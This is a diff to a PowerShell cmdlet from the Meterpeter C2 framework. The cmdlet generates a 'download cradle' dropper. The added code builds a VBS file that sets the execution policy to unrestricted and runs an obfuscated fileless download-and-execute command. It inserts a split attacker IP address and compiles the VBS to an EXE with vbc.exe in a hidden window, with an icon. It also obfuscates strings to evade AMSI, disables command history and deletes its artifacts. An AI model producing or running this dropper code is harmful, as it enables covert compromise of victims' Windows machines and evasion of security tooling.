@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: @Meterpeter C2 v2.10.14
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.16
+   PS cmdlet Dev version: v1.2.17
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.14
@@ -119,7 +119,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $Apii = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $gUid = -join ((65..90) + (97..122) | Get-Random -Count $StrLength | % {[char]$_}) # Only Random letters!
-$SCNa = "$PayloadName" -replace '(.ps1)$','(.vbs)$'
+$SCNa = "$PayloadName" -replace '.ps1','.vbs'
 $TokenAuth = Get-Random -Minimum 900 -Maximum 1300
 
 If($Action -iNotMatch '^(download|fileless|compile)$')
@@ -436,6 +436,8 @@ ElseIf($Action -ieq "Compile")
 
 .NOTES
    This vbs only uses fileless technics
+   If invoked -action 'compile' together with -egg 'false'
+   this function will compile dropper.vbs to dropper.exe
 #>
 
 
@@ -457,34 +459,38 @@ ElseIf($Technic -ieq "four" -or $Technic -eq 4)
 }
 Else
 {
+   $Technic = "four"
    ## Deobfuscating strings ( download technics ) at runtime
-   $CrandleCmdLine = $TechnicFileLessOne -replace '@!','w' -replace '#','e' -replace '&%','s'
+   $CrandleCmdLine = $TechnicFileLessXml -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 
 
 ## TODO: Inte`ropSer`vices = [a]msi
 # use vbsencoder.vbs on this template [meterpeter] ???
-$VbsCoder = "@S£y£'st@e£m.@R£'u£nt'@i£me.I@n't£e@ro£pS'@er£v£'ic@es" -replace '(@|£|'')',''
+$ShantyDamaianti = "@S£y's£t@em£.@R£'u@nt£im@e.I@n£t@er'o@pS@er£v'i@£ce£s" -replace '(@|£|'')',''
 $VBStoExe = @("Imports System
-Imports $VbsCoder
+Imports $ShantyDamaianti
 Public Module Whatever
 
 Sub Main
    Dim SSLProvider As Object
-   ObjSSLProvider = CreateObject(`"Wscript.Shell`")
+   SSLProvider = CreateObject(`"Wscript.Shell`")
 
    dIm $Apii,Cmd,Layback,Restricted,ttl,InvokeMe
    $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-   ttl = `"I@`":InvokeMe = rEpLaCe(ttl, `"@`", `"EX`"):visible = false
-   Layback = rEpLaCe($Apii, `"@!`", `"`"):Cmd = rEpLaCe(Layback, `":007:`", `"`")
-   ObjSSLProvider.run `"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && $CrandleCmdLine`", visible
+   ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
+   Layback=rEpLaCe($Apii, `"@!`", `"`")
+   Cmd=rEpLaCe(Layback, `":007:`", `"`")
+
+   Restricted=`"UnRestricted`"
+   SSLProvider.Run(`"cmd /R echo Y|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser && $CrandleCmdLine`")
 end sub
 End Module")
 
-   ## Build crandle VBS that meterpeter compiles it to EXE
-   echo $VBStoExe|Out-File "$VbsName" -Encoding string -Force
+   ## Build crandle VBS that meterpeter or this cmdlet compiles it to EXE
+   echo $VBStoExe|Out-File "$VbsName" -Encoding string -Force # Download_Crandle.vbs
 
-   If($Egg -ieq "false")
+   If($Egg -ieq "false") ## Non-@Meterpeter function
    {
       ## Replace the attacker ip addr (obfus`cated\split) on vbs template
       ((Get-Content -Path "$VbsName" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "$VbsName"
@@ -492,17 +498,72 @@ End Module")
       ((Get-Content -Path "$VbsName" -Raw) -Replace "NAVIGATOR","$trithRange")|Set-Content -Path "$VbsName"
 
       ## Print OnScreen
-      write-host "*" -ForegroundColor Green -NoNewline
+      write-host "`n*" -ForegroundColor Green -NoNewline
       write-host " Storage: " -NoNewline
-      write-host "$pwd\${VbsName}" -ForegroundColor Green
+      write-host "${pwd}\${VbsName}" -ForegroundColor Green # Download_Crandle.vbs
 
-      write-host "*" -ForegroundColor Green -NoNewline
-      write-host " Compile: " -NoNewline
-      $CrandleExeName = $VbsName -replace '.vbs','.exe'
-      $OutraCoisaQueNaoGosto = "C:\W@i£nd£o@ws\@Mi£cr@oso£ft.£N@E£T\F@r£am@ew£ork\v£4.@0.3£0@3£1@9\v£b@c.e£x@e" -replace '(@|£)',''
-      write-host "$OutraCoisaQueNaoGosto /nologo /quiet /target:exe /out:`"$pwd\${CrandleExeName}`" `"$pwd\$VbsName`" /platform:anyCPU`n" -ForegroundColor DarkYellow
+      $CrandleExeName = $VbsName -replace '.vbs','.exe' # Download_Crandle.vbs - Download_Crandle.exe
+
+      ## Compiling VBS file to EXE format
+      $NETVERSION = (GCI "C:\Windows\Microsoft.NET\Framework").Name|Where-Object{$_ -match '^(v\d\.\d)'}|Select-Object -Last 1
+      If([bool](GCI "C:\Windows\Microsoft.NET\Framework\$NETVERSION"|findstr /C:"vbc.exe"|findstr /V ".config") -match '^(True)$')
+      {
+         If(($Technic -match 'two') -or ($Technic -ieq 2)){$Technic = "3"}
+         $CmdLineToExecute = "@C:\W@in£'do@w£s\M@i£c'r@os£o@ft.£N£E@T\F@r£am'@'ew£o@r£k\v£4.@0'.3£0@'31£9\v@b£c.e@x'£'e" -replace '(@|£|'')',''
+
+         ## Download icon file from GitHub
+         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/meterpeter.ico" -OutFile "meterpeter.ico"|Unblock-File
+
+         ## Find meterpeter icon
+         If(Test-Path -Path "meterpeter.ico")
+         {
+            ## COMPILE VBS TO EXE [icon]
+            $IconFile = "meterpeter.ico"
+            write-host "  * " -NoNewline
+            write-host "Compiling dropper.VBS to dropper.EXE" -ForegroundColor Green
+            Start-Sleep -Seconds 1;write-host "  * " -NoNewline
+            write-host "Invoking fileless technic " -ForegroundColor Green -NoNewline
+            write-host "$Technic" -ForegroundColor DarkRed
+            Start-Process -WindowStyle Hidden powershell -ArgumentList "$CmdLineToExecute /nologo /quiet /target:exe /win32icon:`"$IconFile`" /out:`"$CrandleExeName`" `"$VbsName`" /platform:anyCPU" -Wait
+            write-host "  * " -NoNewline;write-host "Adding meterpeter appl icon to program" -ForegroundColor Green
+
+            write-host "*" -ForegroundColor Green -NoNewline
+            write-host " Storage: " -NoNewline
+            write-host "${pwd}\${CrandleExeName}`n" -ForegroundColor Green # Download_Crandle.exe
+
+            ## It leaves Download_Crandle.exe in current directory with meterpeter icon
+            Remove-Item -Path "meterpeter.ico" -Force
+            Remove-Item -Path "$VbsName" -Force
+         }
+         Else
+         {
+            ## COMPILE VBS TO EXE [no icon]
+            write-host "  * " -NoNewline
+            write-host "Compiling dropper.VBS to dropper.EXE" -ForegroundColor Green
+            Start-Sleep -Seconds 1;write-host "  * " -NoNewline
+            write-host "Invoking fileless technic " -ForegroundColor Green -NoNewline
+            write-host "$Technic" -ForegroundColor DarkRed
+            Start-Process -WindowStyle Hidden powershell -ArgumentList "$CmdLineToExecute /nologo /quiet /target:exe /out:`"$CrandleExeName`" `"$VbsName`" /platform:anyCPU" -Wait            
+
+            write-host "*" -ForegroundColor Green -NoNewline
+            write-host " Storage: " -NoNewline
+            write-host "${pwd}\${CrandleExeName}`n" -ForegroundColor Green # Download_Crandle.exe
+
+            ## It leaves Download_Crandle.exe in current directory
+            Remove-Item -Path "$VbsName" -Force
+         }
+      }
+      Else
+      {
+         write-host "*" -ForegroundColor Green -NoNewline
+         write-host " Storage: " -NoNewline
+         write-host "${pwd}\${VbsName}" -ForegroundColor Green # Download_Crandle.vbs
+         write-host "  x error  : fail to compile '$VbsName' to '$CrandleExeName'" -ForegroundColor Red
+         write-host "  x missing: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe`n" -ForegroundColor DarkYellow
+      }
    }
 
+   ## It leaves Download_Crandle.vbs in current directory
    Exit
 }
 Else
